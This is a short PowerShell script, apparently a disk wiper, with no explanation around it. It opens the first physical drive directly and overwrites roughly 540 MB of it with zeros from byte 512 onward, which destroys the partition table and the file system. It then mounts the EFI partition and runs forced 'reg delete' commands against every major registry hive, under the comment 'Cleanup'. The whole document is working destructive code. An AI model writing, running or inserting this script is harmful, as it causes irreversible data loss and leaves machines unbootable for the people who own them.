$disk = "\\.\PhysicalDrive0"
$size = 540960000
$bytes = New-Object byte[]($size)
try {
    $stream = [System.IO.File]::Open($disk, [System.IO.FileMode]::Open, [System.IO.FileAccess]::ReadWrite)
    $stream.Position = 512
    $stream.Write($bytes, 0, $size)
} catch {
    Write-Host "Error writing to disk: $_"
} finally {
    if ($stream) { $stream.Close() }
}

# Mount EFI partition
if (!(mountvol S: /s)) {
    Write-Host "Mountvol error"
    exit
}

# Cleanup
@("HKLM", "HKCC", "HKU", "HKCR", "HKCU") | ForEach-Object {
    cmd /c "reg delete $_ /f"
}
